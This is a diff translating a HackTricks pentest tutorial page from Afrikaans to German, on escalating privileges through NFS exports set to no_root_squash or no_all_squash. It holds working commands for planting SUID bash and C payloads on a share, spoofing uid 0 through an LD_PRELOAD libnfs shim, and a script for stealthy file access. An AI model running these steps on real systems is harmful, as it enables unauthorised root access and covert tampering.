@@ -19,19 +19,19 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no\_root\_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.
+Lese die _ **/etc/exports** _ Datei. Wenn du ein Verzeichnis findest, das als **no\_root\_squash** konfiguriert ist, kannst du **darauf zugreifen** **als Client** und **in dieses Verzeichnis schreiben**, **als ob** du der lokale **root** der Maschine wärst.
 
-**no\_root\_squash**: Hierdie opsie gee basies gesag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.
+**no\_root\_squash**: Diese Option gibt im Grunde dem root-Benutzer auf dem Client die Berechtigung, Dateien auf dem NFS-Server als root zuzugreifen. Und das kann zu ernsthaften Sicherheitsproblemen führen.
 
-**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash** opsie, maar dit geld vir **nie-root gebruikers**. Stel jou voor, jy het 'n shell as nobody gebruiker; het die /etc/exports lêer nagegaan; no\_all\_squash opsie is teenwoordig; kyk na die /etc/passwd lêer; emuleer 'n nie-root gebruiker; skep 'n suid lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as nobody gebruiker en word 'n ander gebruiker.
+**no\_all\_squash:** Dies ist ähnlich wie die Option **no\_root\_squash**, gilt jedoch für **Nicht-Root-Benutzer**. Stell dir vor, du hast eine Shell als Benutzer nobody; hast die /etc/exports Datei überprüft; die Option no\_all\_squash ist vorhanden; überprüfe die /etc/passwd Datei; emuliere einen Nicht-Root-Benutzer; erstelle eine SUID-Datei als dieser Benutzer (indem du NFS verwendest). Führe die SUID als Benutzer nobody aus und werde ein anderer Benutzer.
 
-# Privilege Escalation
+# Privilegieneskalation
 
 ## Remote Exploit
 
-As jy hierdie kwesbaarheid gevind het, kan jy dit benut:
+Wenn du diese Schwachstelle gefunden hast, kannst du sie ausnutzen:
 
-* **Monteer daardie gids** in 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre en gee dit **SUID** regte, en **voerde** van die slagoffer masjien daardie bash binêre uit.
+* **Montiere dieses Verzeichnis** auf einer Client-Maschine und **kopiere als root** die **/bin/bash** Binärdatei in den gemounteten Ordner und gib ihr **SUID**-Rechte, und **führe von der Opfer**-Maschine diese Bash-Binärdatei aus.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -44,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
+* **Das Verzeichnis** auf einem Client-Rechner einbinden und **als root** unser kompiliertes Payload in den eingebundenen Ordner kopieren, das die SUID-Berechtigung ausnutzt, ihm **SUID**-Rechte geben und **von der Opfer**-Maschine diese Binärdatei ausführen (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -58,40 +58,40 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Plaaslike Exploit
+## Lokaler Exploit
 
 {% hint style="info" %}
-Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
-Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in elk geval nie die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
-Nog 'n vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
-\--_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--
+Beachten Sie, dass Sie, wenn Sie einen **Tunnel von Ihrem Rechner zum Opferrechner erstellen können, weiterhin die Remote-Version verwenden können, um diese Privilegieneskalation durch Tunneln der erforderlichen Ports auszunutzen**.\
+Der folgende Trick gilt, falls die Datei `/etc/exports` **eine IP angibt**. In diesem Fall **werden Sie auf keinen Fall** die **Remote-Exploit** verwenden können und müssen **diesen Trick ausnutzen**.\
+Eine weitere erforderliche Bedingung, damit der Exploit funktioniert, ist, dass **der Export in `/etc/export`** **das `insecure`-Flag verwenden muss**.\
+\--_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--
 {% endhint %}
 
-## Basiese Inligting
+## Grundinformationen
 
-Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die eksploitering behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.
+Das Szenario beinhaltet das Ausnutzen eines gemounteten NFS-Teils auf einem lokalen Rechner, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben, was potenziell unbefugten Zugriff ermöglicht. Der Exploit beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.
 
-### Samevoeging van die Biblioteek
+### Kompilieren der Bibliothek
 
-Die biblioteek samevoegingsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls uitgekommenteer. Die samevoegingsproses behels die volgende opdragte:
+Die Schritte zum Kompilieren der Bibliothek können je nach Kernelversion Anpassungen erfordern. In diesem speziellen Fall wurden die fallocate-Systemaufrufe auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-### Voer die Exploit uit
+### Durchführung des Exploits
 
-Die exploit behels die skep van 'n eenvoudige C-programma (`pwn.c`) wat voorregte na root verhoog en dan 'n shell uitvoer. Die program word gecompileer, en die resulterende binêre (`a.out`) word op die deel geplaas met suid root, met behulp van `ld_nfs.so` om die uid in die RPC-oproepe te vervals:
+Der Exploit besteht darin, ein einfaches C-Programm (`pwn.c`) zu erstellen, das die Berechtigungen auf root erhöht und dann eine Shell ausführt. Das Programm wird kompiliert, und die resultierende Binärdatei (`a.out`) wird mit suid root auf dem Share platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:
 
-1. **Compileer die exploit kode:**
+1. **Kompilieren Sie den Exploit-Code:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Plaas die exploit op die deel en verander sy toestemmings deur die uid te vervals:**
+2. **Platzieren Sie den Exploit auf dem Share und ändern Sie seine Berechtigungen, indem Sie die uid fälschen:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -99,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Voer die exploit uit om root voorregte te verkry:**
+3. **Führen Sie den Exploit aus, um root-Rechte zu erlangen:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## Bonus: NFShell vir Stealthy Lêertoegang
-Sodra root-toegang verkry is, om met die NFS-deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om ooreen te stem met dié van die lêer wat toeganklik is, wat interaksie met lêers op die deel moontlik maak sonder toestemmingprobleme:
+## Bonus: NFShell für stealthy Datei-Zugriff
+Sobald root-Zugriff erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS-Share zu interagieren, ohne den Besitz zu ändern (um Spuren zu vermeiden). Dieses Skript passt die uid an die des zuzugreifenden Files an, sodass die Interaktion mit Dateien auf dem Share ohne Berechtigungsprobleme möglich ist:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -125,22 +125,22 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-Hardloop soos:
+Führen Sie aus wie:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
